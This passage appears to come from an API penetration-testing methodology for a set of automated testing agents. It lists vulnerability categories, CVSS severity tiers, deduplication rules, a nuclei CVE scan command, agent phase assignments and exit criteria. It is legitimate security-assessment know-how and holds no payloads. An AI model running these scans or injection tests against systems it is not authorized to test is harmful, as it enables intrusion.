      - oauth_misconfigurations
      - api_key_issues
      - rate_limiting_gaps
    authorization:
      - bola_findings
      - bfla_findings
      - mass_assignment
      - excessive_data_exposure
    injection:
      - sqli_findings
      - nosqli_findings
      - command_injection
      - ssrf_findings
    business_logic:
      - race_conditions
      - resource_exhaustion
      - batch_abuse
    data_exposure:
      - sensitive_data_leaks
      - debug_endpoints
      - version_disclosure
    protocol_specific:
      - graphql_vulnerabilities
      - websocket_vulnerabilities
      - grpc_vulnerabilities
```

### 9.2 Severity Scoring

```
CRITICAL (CVSS 9.0-10.0):
  - Authentication bypass allowing full API access
  - SQL injection with data exfiltration
  - RCE via API parameters
  - SSRF to cloud metadata with credential access

HIGH (CVSS 7.0-8.9):
  - BOLA/IDOR with PII access
  - Mass assignment to privilege escalation
  - JWT algorithm confusion attack
  - GraphQL introspection exposing sensitive schema

MEDIUM (CVSS 4.0-6.9):
  - Rate limit bypass on authentication endpoints
  - Excessive data exposure (non-PII)
  - CSWSH with limited impact
  - Verbose error messages with stack traces

LOW (CVSS 0.1-3.9):
  - Version disclosure
  - Missing security headers on API responses
  - Information leakage via timing differences
  - Deprecated endpoint exposure

INFORMATIONAL:
  - API documentation publicly accessible
  - HTTP methods allowed but non-functional
  - Technology fingerprinting results
```

### 9.3 Deduplication Rules

```
deduplication_criteria:
  - Same vulnerability type + same endpoint = deduplicate
  - Same vulnerability type + different parameters on same endpoint = merge into single finding
  - Same vulnerability type + different endpoints = separate findings (note pattern)
  - BOLA across multiple endpoints = single finding with list of affected endpoints
  - Same root cause (e.g., missing auth middleware) = single finding, multiple affected endpoints listed
```

### 9.4 Report Generation

```bash
# Generate structured JSON report
# Merge all phase outputs into final report

# Cross-reference with known CVEs
nuclei -u "$API_TARGET" -t cves/ -severity critical,high -o cve_matches.txt

# Generate CVSS scores for each finding
# Map findings to OWASP API Security Top 10 (2023) categories:
#   API1: Broken Object Level Authorization
#   API2: Broken Authentication
#   API3: Broken Object Property Level Authorization
#   API4: Unrestricted Resource Consumption
#   API5: Broken Function Level Authorization
#   API6: Unrestricted Access to Sensitive Business Flows
#   API7: Server Side Request Forgery
#   API8: Security Misconfiguration
#   API9: Improper Inventory Management
#   API10: Unsafe Consumption of APIs
```

---

## Agent Coordination

| Agent | Phases | Responsibilities |
|-------|--------|-----------------|
| APIAgent | 1, 6 | Discovery, enumeration, data exposure |
| GraphQLAgent | 1.3, 7 | GraphQL introspection, query attacks |
| WebSocketAgent | 8 | WebSocket security testing |
| AuthAgent | 2 | Authentication mechanism testing |
| IDORAgent | 3.1, 3.2 | BOLA/BFLA testing |
| SQLiAgent | 4.1, 4.2, 4.3 | SQL/NoSQL/GraphQL injection |
| RCEAgent | 4.4, 4.5 | Command injection, gRPC manipulation |
| SSRFAgent | 4.5 | SSRF via API parameters and tools |
| RaceConditionAgent | 5.4 | Race condition testing |
| BusinessLogicAgent | 5.1, 5.2, 5.3 | Rate limits, resource exhaustion, batch abuse |

## Workflow State Machine

```
IDLE -> DISCOVERY -> AUTH_TESTING -> AUTHZ_TESTING -> INJECTION_TESTING
  -> BUSINESS_LOGIC -> DATA_EXPOSURE -> [GRAPHQL_TESTING] -> [WEBSOCKET_TESTING]
  -> REPORTING -> COMPLETE
```

Conditional branches:
- `GRAPHQL_TESTING`: Only entered if GraphQL endpoint detected in DISCOVERY phase
- `WEBSOCKET_TESTING`: Only entered if WebSocket endpoint detected in DISCOVERY phase
- Any phase may trigger `REPORTING` early if a critical vulnerability is found requiring immediate disclosure

## Exit Criteria

- All endpoints enumerated and tested
- Authentication and authorization tested across all role levels
- Injection testing completed on all parameter types
- Business logic tests executed with timing analysis
- Protocol-specific tests completed for detected protocols
- All findings documented with reproduction steps and CVSS scores
- Report reviewed for deduplication and accuracy
